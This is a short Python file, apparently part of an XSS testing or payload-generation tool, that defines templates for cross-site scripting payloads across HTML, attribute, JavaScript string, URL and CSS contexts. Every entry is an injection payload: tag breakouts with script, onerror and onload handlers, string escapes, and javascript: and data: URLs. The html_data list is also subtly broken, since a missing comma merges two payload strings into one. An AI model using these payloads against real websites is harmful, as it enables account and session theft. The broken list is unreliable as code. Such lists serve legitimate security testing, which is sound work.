# payload skeletons for 5 main injection contexts

SKELETONS = {
    # 1) HTML Data context: closing out the original tag and inserting a new executable tag
    "html_data": [
        "</{tag}><script>{payload}</script>",
        "<script>alert(1)</script>"
        "</{tag}><img src=x onerror={payload}>",
        "</{tag}><svg onload={payload}></svg>",
    ],

    # 2) Attribute context (quoted & unquoted)
    "attribute": [
        # quoted attribute
        '<{tag} {evt}="{payload}">',
        "<{tag} {evt}='{payload}'>",
        # unquoted attribute
        "<{tag} {evt}={payload}>",
    ],

    # 3) JS String Literal context: breaking out of a JS string
    "js_string": [
        # double‐quote string
        '";{payload}//',
        # single‐quote string
        "';{payload}//",
    ],

    # 4) URL context (href/src)
    "url": [
        # javascript: pseudo‐URL
        "javascript:{payload}",
        # data: URL with inline HTML
        "data:text/html;base64,{b64_payload}",
    ],

    # 5) CSS context (inline <style> or style="" attribute)
    "css": [
        # inline style attribute
        '<{tag} style="background:url({payload})">',
        # inside a <style> block
        "<style>body{{background:url({payload})}}</style>",
    ],
}